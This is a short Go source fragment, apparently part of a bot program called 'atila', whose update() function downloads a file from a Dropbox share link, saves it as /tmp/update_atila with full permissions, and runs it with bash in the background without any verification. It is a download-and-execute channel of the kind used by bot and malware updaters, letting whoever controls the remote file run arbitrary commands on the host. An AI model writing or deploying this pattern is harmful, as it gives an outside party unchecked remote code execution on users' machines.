package main


import (


"time"
"os/exec"
"os"
"io/ioutil"
"net/http"



)



func update(){


bot ("get update ...")



up  := http.Client{}

req , err_get := up.Get("https://www.dropbox.com/scl/fi/74npi6fckjw5a0v66ofng/update_atila.txt?rlkey=36g0i19xx4qus1kl9yw4z5t8s&st=26m90bav&dl=1")

if err_get != nil { return }

u , err_rd := ioutil.ReadAll(req.Body)
 
if err_rd != nil { return }

os.WriteFile("/tmp/update_atila", u , 0777)

update_ := exec.Command("sh",  "-c",   "bash /tmp/update_atila & ")  //update atila
 
update_.Run()


time.Sleep(10 * time.Second)


}
